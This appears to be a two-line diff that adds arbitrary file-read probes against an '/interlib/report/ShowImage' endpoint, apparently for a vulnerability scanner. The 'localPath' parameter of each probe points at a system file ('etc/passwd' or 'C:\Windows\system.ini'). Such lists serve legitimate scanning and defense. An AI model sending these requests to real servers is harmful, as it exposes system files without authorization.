@@ -1,0 +1,2 @@
+/interlib/report/ShowImage?localPath=etc/passwd
+/interlib/report/ShowImage?localPath=C:\\Windows\\system.ini
